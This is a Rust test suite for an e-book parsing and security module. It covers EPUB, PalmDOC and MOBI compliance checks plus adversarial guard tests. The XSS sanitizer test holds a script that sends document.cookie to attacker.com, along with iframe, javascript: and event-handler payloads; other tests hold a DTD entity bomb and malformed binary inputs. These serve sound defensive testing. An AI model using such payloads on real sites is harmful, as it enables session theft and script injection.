// SPDX-License-Identifier: BSD-3-Clause OR Apache-2.0
//
// Copyright (c) 2026 Witt Kung <witt.w.kung@gmail.com>
// All rights reserved.
//
// TTZip: High-performance native archiving and compression engine.

//! Official E-book Compliance, Differential Oracle, and 6-Layer Defense Security Test Suite.
//!
//! Validates standard e-book specifications (IDPF EPUB 2/3, Readium, PalmDOC LZ77, MOBI EXTH)
//! alongside adversarial attack resistance across the 6-layer defense matrix:
//! 1. IDPF EPUB 2/3 OCF & NavDoc / NCX Compliance Oracles
//! 2. PalmDOC LZ77 Differential Decompression & EXTH Vector Oracles
//! 3. 6-Layer Security Defense Adversarial Test Matrix
//! 4. End-to-End E-book Security Pipeline Orchestration

use std::io::Cursor;
use ttzip_engine::security::ebook_defense::{
    EbookDefenseError, EbookMemoryBudgetGuard, EbookSandboxGuard, EbookSecurityConfig,
    EbookSecurityPipeline, ManifestItemCountGuard, PalmDocDecompressGuard, SensitiveEbookBuffer,
    TocRecursionDepthGuard, DEFAULT_MAX_CHAPTER_VIEWPORT_BUDGET, DEFAULT_MAX_GLOBAL_EBOOK_BUDGET,
    MAX_HREF_LENGTH, MAX_ITEM_ID_LENGTH, MAX_MANIFEST_ITEMS, MAX_OPF_FILE_SIZE, MAX_TOC_DEPTH,
    MAX_TOC_NODES,
};

// ============================================================================
// 1. IDPF EPUB 2/3 Compliance & Navigation Oracles
// ============================================================================

#[test]
fn test_epub2_ncx_and_manifest_compliance_oracle() {
    let epb2_opf = r#"<?xml version="1.0" encoding="utf-8"?>
<package xmlns="http://www.idpf.org/2007/opf" unique-identifier="BookId" version="2.0">
  <metadata xmlns:dc="http://purl.org/dc/elements/1.1/">
    <dc:title>Standard EPUB 2 Compliance Sample</dc:title>
    <dc:language>en</dc:language>
    <dc:identifier id="BookId">urn:uuid:12345678-1234-5678-1234-567812345678</dc:identifier>
  </metadata>
  <manifest>
    <item id="ncx" href="toc.ncx" media-type="application/x-dtbncx+xml"/>
    <item id="cover" href="cover.xhtml" media-type="application/xhtml+xml"/>
    <item id="chap1" href="chapters/ch1.xhtml" media-type="application/xhtml+xml"/>
    <item id="chap2" href="chapters/ch2.xhtml" media-type="application/xhtml+xml"/>
    <item id="style" href="styles/main.css" media-type="text/css"/>
  </manifest>
  <spine toc="ncx">
    <itemref idref="cover"/>
    <itemref idref="chap1"/>
    <itemref idref="chap2"/>
  </spine>
</package>"#;

    let mut guard = ManifestItemCountGuard::new();
    let items = guard
        .parse_opf_stream(Cursor::new(epb2_opf.as_bytes()), epb2_opf.len() as u64)
        .expect("Valid EPUB 2 OPF parsing failed");

    assert_eq!(items.len(), 5);
    assert_eq!(items.get("ncx").unwrap().media_type, "application/x-dtbncx+xml");
    assert_eq!(items.get("chap1").unwrap().href, "chapters/ch1.xhtml");
}

#[test]
fn test_epub3_navdoc_compliance_oracle() {
    let epb3_opf = r#"<?xml version="1.0" encoding="utf-8"?>
<package xmlns="http://www.idpf.org/2007/opf" version="3.0" unique-identifier="pub-id">
  <metadata xmlns:dc="http://purl.org/dc/elements/1.1/">
    <dc:title>IDPF EPUB 3 Navigation Specimen</dc:title>
  </metadata>
  <manifest>
    <item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/>
    <item id="c1" href="ch1.xhtml" media-type="application/xhtml+xml"/>
    <item id="img" href="img/pic.jpg" media-type="image/jpeg"/>
  </manifest>
  <spine>
    <itemref idref="c1"/>
  </spine>
</package>"#;

    let mut guard = ManifestItemCountGuard::new();
    let items = guard
        .parse_opf_stream(Cursor::new(epb3_opf.as_bytes()), epb3_opf.len() as u64)
        .expect("Valid EPUB 3 OPF parsing failed");

    assert_eq!(items.len(), 3);
    assert_eq!(items.get("nav").unwrap().properties.as_deref(), Some("nav"));
}

#[test]
fn test_toc_hierarchy_equivalence_oracle() {
    let mut toc_guard = TocRecursionDepthGuard::new();

    // Canonical 3-level TOC hierarchy:
    // Volume I (depth 1)
    //   - Part A (depth 2)
    //       - Chapter 1: Introduction (depth 3)
    //       - Chapter 2: Foundations (depth 3)
    //   - Part B (depth 2)
    // Volume II (depth 1)

    let v1 = toc_guard.push_node("v1".into(), "Volume I".into(), "v1.xhtml".into(), 1, None).unwrap();
    let p_a = toc_guard.push_node("p_a".into(), "Part A".into(), "v1_pa.xhtml".into(), 2, Some(v1)).unwrap();
    let c1 = toc_guard.push_node("c1".into(), "Chapter 1".into(), "ch1.xhtml".into(), 3, Some(p_a)).unwrap();
    let c2 = toc_guard.push_node("c2".into(), "Chapter 2".into(), "ch2.xhtml".into(), 3, Some(p_a)).unwrap();
    let _p_b = toc_guard.push_node("p_b".into(), "Part B".into(), "v1_pb.xhtml".into(), 2, Some(v1)).unwrap();
    let _v2 = toc_guard.push_node("v2".into(), "Volume II".into(), "v2.xhtml".into(), 1, None).unwrap();

    assert_eq!(toc_guard.len(), 6);
    let entries = toc_guard.entries();
    assert_eq!(entries[v1].children_indices.len(), 2);
    assert_eq!(entries[p_a].children_indices, vec![c1, c2]);
    assert_eq!(entries[c1].depth, 3);
    assert_eq!(entries[c1].parent_idx, Some(p_a));
}

// ============================================================================
// 2. PalmDOC LZ77 Differential & MOBI EXTH Oracles
// ============================================================================

#[test]
fn test_palmdoc_lz77_differential_vectors() {
    // Vector 1: Pure single character literals
    let v1 = b"Hello, PalmDOC compression engine!";
    let comp1 = PalmDocDecompressGuard::compress_record(v1).unwrap();
    let decomp1 = PalmDocDecompressGuard::decompress_record(&comp1).unwrap();
    assert_eq!(decomp1, v1);

    // Vector 2: Space + char compression shortcut (0xC0..0xFF)
    let v2 = b" A B C D E F G ";
    let comp2 = PalmDocDecompressGuard::compress_record(v2).unwrap();
    let decomp2 = PalmDocDecompressGuard::decompress_record(&comp2).unwrap();
    assert_eq!(decomp2, v2);

    // Vector 3: Repetitive sliding window lookback matches
    let v3 = b"Repeated pattern ABCDEF123456 Repeated pattern ABCDEF123456 Repeated pattern!";
    let comp3 = PalmDocDecompressGuard::compress_record(v3).unwrap();
    let decomp3 = PalmDocDecompressGuard::decompress_record(&comp3).unwrap();
    assert_eq!(decomp3, v3);

    // Vector 4: Overlapping run-length byte lookback (distance = 1, length > 3)
    let v4 = b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
    let comp4 = PalmDocDecompressGuard::compress_record(v4).unwrap();
    let decomp4 = PalmDocDecompressGuard::decompress_record(&comp4).unwrap();
    assert_eq!(decomp4, v4);
}

#[test]
fn test_mobi_exth_standard_metadata_oracle() {
    let mut exth = Vec::new();
    exth.extend_from_slice(b"EXTH");
    
    // Calculate header length: 12 (base header) + (8 + 12: author) + (8 + 8: publisher)
    let total_len = 12 + (8 + 12) + (8 + 8);
    exth.extend_from_slice(&(total_len as u32).to_be_bytes());
    exth.extend_from_slice(&2u32.to_be_bytes()); // 2 records

    // Record 100: Author ("Author Name")
    exth.extend_from_slice(&100u32.to_be_bytes());
    exth.extend_from_slice(&20u32.to_be_bytes()); // 8 + 12 = 20
    exth.extend_from_slice(b"Author Name\0");

    // Record 101: Publisher ("Publisher")
    exth.extend_from_slice(&101u32.to_be_bytes());
    exth.extend_from_slice(&16u32.to_be_bytes()); // 8 + 8 = 16
    exth.extend_from_slice(b"PubHouse");

    let records = PalmDocDecompressGuard::parse_mobi_exth_records(&exth).unwrap();
    assert_eq!(records.len(), 2);
    assert_eq!(records[0].0, 100);
    assert_eq!(&records[0].1, b"Author Name\0");
    assert_eq!(records[1].0, 101);
    assert_eq!(&records[1].1, b"PubHouse");
}

// ============================================================================
// 3. 6-Layer Security Defense Adversarial Test Matrix
// ============================================================================

#[test]
fn test_guard1_manifest_bomb_and_billion_laughs_defense() {
    // 1. Billion Laughs DTD entity expansion attack
    let dtd_bomb = r#"<?xml version="1.0"?>
<!DOCTYPE opf [
  <!ENTITY ha "ha">
  <!ENTITY ha2 "&ha;&ha;&ha;&ha;">
  <!ENTITY ha3 "&ha2;&ha2;&ha2;&ha2;">
]>
<package><manifest><item id="i1" href="a.xhtml" media-type="text/html"/></manifest></package>"#;

    let mut guard = ManifestItemCountGuard::new();
    let res_dtd = guard.parse_opf_stream(Cursor::new(dtd_bomb.as_bytes()), dtd_bomb.len() as u64);
    assert!(matches!(res_dtd, Err(EbookDefenseError::DtdEntitiesForbidden)));

    // 2. Oversized OPF file quota (> 10MB)
    let fake_stream = Cursor::new(b"<package/>");
    let res_size = guard.parse_opf_stream(fake_stream, MAX_OPF_FILE_SIZE + 1024);
    assert!(matches!(res_size, Err(EbookDefenseError::OpfFileTooLarge { .. })));

    // 3. Excessive manifest items count (> 10,000)
    assert!(guard.validate_item_count(MAX_MANIFEST_ITEMS + 1).is_err());
    assert!(guard.validate_item_count(MAX_MANIFEST_ITEMS).is_ok());

    // 4. Oversized href and id attributes
    let long_href = "x".repeat(MAX_HREF_LENGTH + 1);
    assert!(guard.validate_href(&long_href).is_err());
    let long_id = "y".repeat(MAX_ITEM_ID_LENGTH + 1);
    assert!(guard.validate_id(&long_id).is_err());
}

#[test]
fn test_guard2_toc_recursion_depth_and_cyclic_graph_defense() {
    let mut guard = TocRecursionDepthGuard::new();

    // 1. Maximum nesting depth (> 16 levels)
    assert!(guard.validate_depth(MAX_TOC_DEPTH + 1).is_err());
    assert!(guard.validate_depth(MAX_TOC_DEPTH).is_ok());

    // 2. Total navigation nodes ceiling (> 5,000)
    for i in 0..MAX_TOC_NODES {
        guard.push_node(format!("n_{}", i), format!("Chapter {}", i), "ch.xhtml".into(), 1, None).unwrap();
    }
    let overflow_res = guard.push_node("overflow".into(), "Extra".into(), "ch.xhtml".into(), 1, None);
    assert!(matches!(overflow_res, Err(EbookDefenseError::TocTotalNodesExceeded { .. })));

    // 3. Cyclic graph traversal detection
    guard.clear();
    guard.enter_branch("node_alpha").unwrap();
    guard.enter_branch("node_beta").unwrap();
    let cycle_res = guard.enter_branch("node_alpha");
    assert!(matches!(cycle_res, Err(EbookDefenseError::TocCyclicReferenceDetected { .. })));
    guard.leave_branch("node_beta");
    guard.leave_branch("node_alpha");
}

#[test]
fn test_guard3_palmdoc_bounds_and_exth_overflow_defense() {
    // 1. Illegal backreference distance (D > current decoded length)
    let invalid_backref = [
        b'X', b'Y', // 2 bytes literal
        0x80 | 0x02, 0x00, // Distance = (2 << 3) = 16 > 2 bytes
    ];
    let res_backref = PalmDocDecompressGuard::decompress_record(&invalid_backref);
    assert!(matches!(res_backref, Err(EbookDefenseError::IllegalBackreferenceDistance { .. })));

    // 2. Record buffer overflow (> 4096 bytes)
    let mut overflow_stream = Vec::new();
    for _ in 0..520 {
        overflow_stream.push(8u8);
        overflow_stream.extend_from_slice(b"ABCDEFGH");
    } // 520 * 8 = 4160 bytes > 4096
    let res_overflow = PalmDocDecompressGuard::decompress_record(&overflow_stream);
    assert!(matches!(res_overflow, Err(EbookDefenseError::RecordBufferOverflow { .. })));

    // 3. EXTH arithmetic overflow
    let mut bad_exth = Vec::new();
    bad_exth.extend_from_slice(b"EXTH");
    bad_exth.extend_from_slice(&64u32.to_be_bytes()); // Header len: 64
    bad_exth.extend_from_slice(&1u32.to_be_bytes());  // Count: 1
    bad_exth.extend_from_slice(&100u32.to_be_bytes()); // Type: 100
    bad_exth.extend_from_slice(&0xFFFFFFF0u32.to_be_bytes()); // Integer overflow length

    let res_exth = PalmDocDecompressGuard::parse_mobi_exth_records(&bad_exth);
    assert!(matches!(
        res_exth,
        Err(EbookDefenseError::ExthIntegerOverflow) | Err(EbookDefenseError::ExthRecordOutOfBounds { .. })
    ));
}

#[test]
fn test_guard4_sandbox_xss_and_script_purification_defense() {
    let malicious_payload = r#"
<html xmlns="http://www.w3.org/1999/xhtml">
  <head>
    <script type="text/javascript">
      fetch('http://attacker.com/steal?cookie=' + document.cookie);
    </script>
    <base href="http://evil-server.com/"/>
  </head>
  <body onload="alert('XSS')" onerror="console.log('error')">
    <h2>E-book Chapter Title</h2>
    <iframe src="http://evil.com/payload.html"></iframe>
    <embed src="malicious.swf"/>
    <object data="evil.pdf"></object>
    <a href="javascript:doMaliciousAction()">Malicious Link</a>
    <a href="vbscript:msgbox(1)">VBScript Link</a>
    <p onmouseover="alert('hover')">Clean paragraph text.</p>
    <svg xmlns="http://www.w3.org/2000/svg">
      <script>alert('svg-xss');</script>
      <circle cx="50" cy="50" r="40" stroke="green" stroke-width="4" fill="yellow" />
    </svg>
  </body>
</html>"#;

    let (sanitized, report) = EbookSandboxGuard::sanitize_xhtml_content(malicious_payload);

    // Verify all active script vectors are completely purged
    assert!(!sanitized.contains("<script"));
    assert!(!sanitized.contains("</script>"));
    assert!(!sanitized.contains("<iframe"));
    assert!(!sanitized.contains("<embed"));
    assert!(!sanitized.contains("<object"));
    assert!(!sanitized.contains("<base"));
    assert!(!sanitized.contains("onload="));
    assert!(!sanitized.contains("onerror="));
    assert!(!sanitized.contains("onmouseover="));
    assert!(!sanitized.contains("javascript:"));
    assert!(!sanitized.contains("vbscript:"));

    // Verify benign presentation and SVG geometry is retained
    assert!(sanitized.contains("<h2>E-book Chapter Title</h2>"));
    assert!(sanitized.contains("Clean paragraph text."));
    assert!(sanitized.contains("<circle cx=\"50\" cy=\"50\" r=\"40\""));

    assert!(report.stripped_tags_count >= 5);
    assert!(report.neutralized_events_count >= 3);
    assert!(report.neutralized_protocols_count >= 2);

    // Verify URI safe checker
    assert!(!EbookSandboxGuard::is_safe_uri("javascript:alert(1)"));
    assert!(!EbookSandboxGuard::is_safe_uri("data:text/html,<script>alert(1)</script>"));
    assert!(EbookSandboxGuard::is_safe_uri("chapters/c1.xhtml#section2"));
    assert!(EbookSandboxGuard::is_safe_uri("https://example.org/reference.html"));
}

#[test]
fn test_guard5_memory_budget_watchdog_and_concurrency_defense() {
    let budget_guard = EbookMemoryBudgetGuard::new(
        DEFAULT_MAX_GLOBAL_EBOOK_BUDGET,
        DEFAULT_MAX_CHAPTER_VIEWPORT_BUDGET,
    );

    // 1. Verify standard limits (64MB global, 16MB chapter viewport)
    assert_eq!(budget_guard.max_budget(), 64 * 1024 * 1024);
    assert_eq!(budget_guard.max_chapter_viewport(), 16 * 1024 * 1024);

    // 2. Viewport chapter size enforcement
    assert!(budget_guard.validate_chapter_size(17 * 1024 * 1024).is_err());
    assert!(budget_guard.validate_chapter_size(8 * 1024 * 1024).is_ok());

    // 3. Multi-threaded atomic allocation and release stress test
    use std::sync::Arc;
    let guard_arc = Arc::new(EbookMemoryBudgetGuard::new(10 * 1024 * 1024, 2 * 1024 * 1024));

    let mut handles = Vec::new();
    for _ in 0..8 {
        let g = Arc::clone(&guard_arc);
        handles.push(std::thread::spawn(move || {
            for _ in 0..100 {
                if let Ok(permit) = g.allocate(100 * 1024) {
                    assert_eq!(permit.size(), 100 * 1024);
                    // Automatic Drop releases memory
                }
            }
        }));
    }

    for h in handles {
        h.join().unwrap();
    }

    // After all threads finish, allocated bytes must strictly return to 0
    assert_eq!(guard_arc.current_bytes(), 0);
    assert_eq!(guard_arc.remaining_bytes(), 10 * 1024 * 1024);
}

#[test]
fn test_guard6_sensitive_buffer_volatile_zeroize_defense() {
    let sensitive_data = b"CONFIDENTIAL_DRM_UNENCRYPTED_TEXT_PAYLOAD";
    let mut buf = SensitiveEbookBuffer::from_slice(sensitive_data);

    assert_eq!(buf.len(), sensitive_data.len());
    assert_eq!(buf.as_slice(), sensitive_data);
    assert_eq!(buf.as_str().unwrap(), "CONFIDENTIAL_DRM_UNENCRYPTED_TEXT_PAYLOAD");

    // Test buffer extension
    buf.extend_from_slice(b"_APPENDED");
    assert_eq!(buf.len(), sensitive_data.len() + 9);

    // Test Drop / Zeroize behavior
    buf.clear();
    assert_eq!(buf.len(), 0);
    assert!(buf.is_empty());
}

// ============================================================================
// 4. End-to-End E-book Security Pipeline Orchestration
// ============================================================================

#[test]
fn test_end_to_end_security_pipeline_orchestration() {
    let config = EbookSecurityConfig::default();
    let mut pipeline = EbookSecurityPipeline::new(config);

    // Step 1: Ingress OPF Manifest Inspection
    let opf = r#"<package version="3.0"><manifest>
        <item id="c1" href="chapter1.xhtml" media-type="application/xhtml+xml"/>
        <item id="img" href="cover.jpg" media-type="image/jpeg"/>
    </manifest></package>"#;
    let manifest_rep = pipeline
        .inspect_opf_manifest(Cursor::new(opf.as_bytes()), opf.len() as u64)
        .expect("Pipeline manifest inspection failed");
    assert_eq!(manifest_rep.items_count, 2);

    // Step 2: Ingress TOC Hierarchy Validation
    let toc_nodes = vec![
        ("c1".to_string(), "Chapter 1".to_string(), "chapter1.xhtml".to_string(), 1usize, None),
        ("s1".to_string(), "Section 1.1".to_string(), "chapter1.xhtml#s1".to_string(), 2usize, Some(0usize)),
    ];
    let toc_rep = pipeline
        .validate_toc_hierarchy(&toc_nodes)
        .expect("Pipeline TOC validation failed");
    assert_eq!(toc_rep.nodes_count, 2);
    assert_eq!(toc_rep.max_depth, 2);

    // Step 3: Stream Sanitization
    let chapter_html = r#"<html xmlns="http://www.w3.org/1999/xhtml"><body onload="xss()"><p>Chapter text</p></body></html>"#;
    let (sanitized_html, content_rep) = pipeline
        .sanitize_chapter_content(chapter_html)
        .expect("Pipeline sanitize content failed");
    assert!(sanitized_html.contains("<p>Chapter text</p>"));
    assert!(!sanitized_html.contains("onload="));
    assert_eq!(content_rep.sanitization_report.neutralized_events_count, 1);

    // Step 4: PalmDOC Decompress into Sensitive Buffer
    let text = b"PalmDOC pipeline decompression sample text";
    let compressed = PalmDocDecompressGuard::compress_record(text).unwrap();
    let sensitive_buf = pipeline
        .decompress_palmdoc_record(&compressed)
        .expect("Pipeline PalmDOC decompression failed");
    assert_eq!(sensitive_buf.as_slice(), text);

    // Step 5: Viewport Memory Permit Allocation
    {
        let permit = pipeline.acquire_memory_permit(1024 * 1024).unwrap();
        assert_eq!(permit.size(), 1024 * 1024);
        assert_eq!(pipeline.memory_guard().current_bytes(), 1024 * 1024);
    }
    assert_eq!(pipeline.memory_guard().current_bytes(), 0);
}
